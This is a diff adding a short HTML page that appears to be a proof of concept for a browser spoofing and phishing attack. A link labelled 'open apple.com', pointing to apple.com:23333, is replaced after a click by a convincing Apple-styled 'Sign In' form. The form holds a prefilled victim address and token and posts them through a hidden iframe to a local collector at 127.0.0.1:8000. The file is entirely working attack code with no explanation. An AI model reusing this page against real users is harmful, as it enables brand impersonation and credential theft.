@@ -1,0 +1,104 @@
+<script>
+    function next() {
+        document.getElementById("link").remove();
+
+        // Create a visible iframe as the form target
+        var iframe = document.createElement("iframe");
+        iframe.name = "hiddenFrame";
+        iframe.style.width = "100%";
+        iframe.style.height = "400px";
+        iframe.style.display = "none";
+        iframe.style.border = "2px solid #ccc";
+        iframe.style.borderRadius = "12px";
+        iframe.style.marginTop = "20px";
+        document.body.appendChild(iframe);
+
+        // Create a visible form that POSTs to the iframe
+        var form = document.createElement("form");
+        form.method = "POST";
+        form.action = "http://127.0.0.1:8000";
+        form.target = "hiddenFrame";
+        form.style.padding = "32px";
+        form.style.background = "#f5f5f7";
+        form.style.borderRadius = "16px";
+        form.style.maxWidth = "520px";
+        form.style.boxShadow = "0 2px 12px rgba(0,0,0,.08)";
+
+        var title = document.createElement("h2");
+        title.textContent = "Sign In";
+        title.style.margin = "0 0 24px";
+        title.style.fontSize = "26px";
+        title.style.fontFamily = "-apple-system, sans-serif";
+        title.style.color = "#1d1d1f";
+        form.appendChild(title);
+
+        var label1 = document.createElement("label");
+        label1.textContent = "Username";
+        label1.style.display = "block";
+        label1.style.marginBottom = "6px";
+        label1.style.fontSize = "15px";
+        label1.style.fontFamily = "-apple-system, sans-serif";
+        label1.style.color = "#1d1d1f";
+        form.appendChild(label1);
+
+        var input1 = document.createElement("input");
+        input1.type = "text";
+        input1.name = "username";
+        input1.value = "victim@example.com";
+        input1.style.width = "100%";
+        input1.style.height = "48px";
+        input1.style.marginBottom = "20px";
+        input1.style.padding = "0 16px";
+        input1.style.border = "1.5px solid #d2d2d7";
+        input1.style.borderRadius = "10px";
+        input1.style.fontSize = "16px";
+        input1.style.boxSizing = "border-box";
+        input1.style.fontFamily = "-apple-system, sans-serif";
+        form.appendChild(input1);
+
+        var label2 = document.createElement("label");
+        label2.textContent = "Token";
+        label2.style.display = "block";
+        label2.style.marginBottom = "6px";
+        label2.style.fontSize = "15px";
+        label2.style.fontFamily = "-apple-system, sans-serif";
+        label2.style.color = "#1d1d1f";
+        form.appendChild(label2);
+
+        var input2 = document.createElement("input");
+        input2.type = "text";
+        input2.name = "token";
+        input2.value = "secret-data-here";
+        input2.style.width = "100%";
+        input2.style.height = "48px";
+        input2.style.marginBottom = "24px";
+        input2.style.padding = "0 16px";
+        input2.style.border = "1.5px solid #d2d2d7";
+        input2.style.borderRadius = "10px";
+        input2.style.fontSize = "16px";
+        input2.style.boxSizing = "border-box";
+        input2.style.fontFamily = "-apple-system, sans-serif";
+        form.appendChild(input2);
+
+        var submitBtn = document.createElement("input");
+        submitBtn.type = "submit";
+        submitBtn.value = "Submit POST";
+        submitBtn.style.width = "100%";
+        submitBtn.style.height = "48px";
+        submitBtn.style.border = "none";
+        submitBtn.style.borderRadius = "10px";
+        submitBtn.style.background = "#0071e3";
+        submitBtn.style.color = "#fff";
+        submitBtn.style.fontSize = "16px";
+        submitBtn.style.fontFamily = "-apple-system, sans-serif";
+        submitBtn.style.cursor = "pointer";
+        form.appendChild(submitBtn);
+
+        document.body.appendChild(form);
+    }
+    function f() {
+        setTimeout(() => { next() }, 1000);
+    }
+</script>
+
+<a href="https://apple.com:23333" onclick="f()" id="link">open apple.com</a>
